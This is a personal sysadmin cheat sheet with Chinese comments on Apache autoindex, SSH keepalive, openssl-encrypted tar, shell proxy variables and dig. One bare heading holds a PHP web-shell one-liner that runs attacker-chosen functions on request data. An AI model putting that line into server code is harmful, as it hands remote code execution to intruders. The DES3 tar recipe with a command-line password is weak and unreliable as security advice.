# fswatch
`go install github.com/codeskyblue/fswatch`

# httpd
* [http://httpd.apache.org/docs/trunk/mod/mod_autoindex.html#indexoptions](http://httpd.apache.org/docs/trunk/mod/mod_autoindex.html#indexoptions)

```

    Options Indexes FollowSymLinks
    IndexOptions FoldersFirst HTMLTable NameWidth=* VersionSort
```


# ($_=@$_GET[2]).@$_($_POST[1])


# ssh connection alive
## server
```

	TCPKeepAlive yes #表示TCP保持连接不断开
	ClientAliveInterval 300 #指定服务端向客户端请求消息的时间间隔，单位是秒，默认是0，不发送。设置个300表示5分钟发送一次（注意，这里是服务端主动发起），然后等待客户端响应，成功，则保持连接。
	ClientAliveCountMax 3 #指服务端发出请求后客户端无响应则自动断开的最大次数。使用默认给的3即可。
```
### 注意：TCPKeepAlive必须打开，否则直接影响后面的设置。ClientAliveInterval设置的值要小于各层防火墙的最小值，不然，也就没用了。最后要重启sshd服务才生效
## client
```

	Host * #表示需要启用该规则的服务端（域名或ip）
		ServerAliveInterval 60 #表示没60秒去给服务端发起一次请求消息（这个设置好就行了）
		ServerAliveCountMax 3 #表示最大连续尝试连接次数（这个基本不用设置）
```
## one time
`ssh -o ServerAliveInterval=30 user@host`


# secure tar
```

	tar czf - package | openssl des3 -salt -k youPassword -out tar.tar.gz
	#dd if=tar.tar.gz |openssl tar -d -k youPassword |tar zxf -
	openssl des3 -d -salt -k youPassword -in tar.tar.gz | tar xzf -
```


# bash proxy
```

		export https_proxy=10.0.0.52:8080
		export https_proxy=user:pass@192.158.8.8:8080
		export https_proxy=socks://10.0.0.52:1080
		export https_proxy=socks4://10.0.0.52:1080
		export https_proxy=socks5://10.0.0.52:1080
		export ftp_proxy=socks5://10.0.0.52:1080
		export no_proxy="*.aiezu.com,10.*.*.*,192.168.*.*,*.local,localhost,127.0.0.1"
```


# dig
`dig txt b.aliyuntest.com @8.8.8.8`
